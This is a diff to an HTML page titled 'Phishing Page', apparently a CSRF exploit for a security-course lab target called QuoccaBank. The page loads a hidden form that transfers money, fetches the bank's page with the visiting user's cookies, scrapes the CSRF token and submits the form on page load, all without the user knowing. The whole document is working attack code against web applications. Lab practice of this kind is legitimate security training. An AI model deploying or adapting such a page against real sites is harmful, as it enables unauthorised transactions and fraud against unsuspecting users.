@@ -1,20 +1,35 @@
 <html>
+<head>
+    <title>Phishing Page</title>
+</head>
 <body>
-<form id="transferForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-    <input type="hidden" name="csrf_token" id="csrfToken">
-    <input type="hidden" name="username" value="z5481975">
-    <input type="hidden" name="amount" value="100">
-</form>
-<script>
-// Fetch the CSRF token dynamically (e.g., from the page or an endpoint)
-fetch('https://phish-me.quoccacorp.com') // Adjust this to the page or endpoint that contains the token
-    .then(response => response.text())
-    .then(data => {
-        // Extract the token from the response (e.g., using regex or DOM parsing)
-        var token = data.match(/name="csrf_token" value="([^"]+)"/)[1];
-        document.getElementById('csrfToken').value = token;
-        document.getElementById('transferForm').submit();
-    });
-</script>
+    <form id="transferForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+        <input type="hidden" name="csrf_token" id="csrfToken">
+        <input type="hidden" name="username" value="z5481975">
+        <input type="hidden" name="amount" value="100">
+    </form>
+    <script>
+        // Fetch the main QuoccaBank page to get the CSRF token
+        fetch('https://phish-me.quoccacorp.com/', {
+            method: 'GET',
+            credentials: 'include' // Include cookies so the bot's session is used
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Parse the HTML to find the CSRF token
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(data, 'text/html');
+            const token = doc.querySelector('input[name="csrf_token"]').value;
+
+            // Set the CSRF token in the form
+            document.getElementById('csrfToken').value = token;
+
+            // Auto-submit the form
+            document.getElementById('transferForm').submit();
+        })
+        .catch(error => {
+            console.error('Error fetching CSRF token:', error);
+        });
+    </script>
 </body>
 </html>
